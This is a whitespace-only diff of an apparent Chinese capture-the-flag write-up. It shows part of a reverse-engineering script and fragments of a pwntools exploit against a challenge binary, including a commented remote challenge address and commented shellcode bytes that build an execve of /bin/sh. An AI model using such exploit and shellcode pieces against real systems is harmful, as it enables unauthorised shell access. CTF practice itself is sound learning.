@@ -184,10 +184,10 @@ url编码加号，得到flag
 经过分析写出后面位运算部分和异或的逆运算的python脚本（原来要逆运算这一堆位运算就是他本身- -
 
 ```python
-ezlife=['E','a','s','y','l','i','f','3']
-ezre=['e','4','s','y','_','R','e','_']								#用ida查看异或结果匹配的字符串
-newre=[]
-newlife=[]
+ezlife=['E','a','s','y','l','i','f','3']  
+ezre=['e','4','s','y','_','R','e','_']								#用ida查看异或结果匹配的字符串  
+newre=[]  
+newlife=[]  
 v6 = [0x4c,0x3c,0xd6,0x36,0x50,0x88,0x20,0xcc]				#用ida查看变量v6的值
 
 for ez in ezre:
@@ -260,9 +260,9 @@ for i in part2:
 写exp
 
 ```python
-#!/usr/bin/env python2
-# -*- coding: utf-8 -*-
-from pwn import *
+#!/usr/bin/env python2  
+# -*- coding: utf-8 -*-  
+from pwn import *  
 
 p = process('./aaa')
 #p = remote("47.103.214.163",  20001)
@@ -350,7 +350,7 @@ p.send(payload)
 
 p.interactive()
 
-#''
+
 #'jhH\xb8/bin'
 #'///sPH\x89\xe7' -> 16683945804937768751 -> -1762798268771782865
 #'hri\x01\x01\x814$'
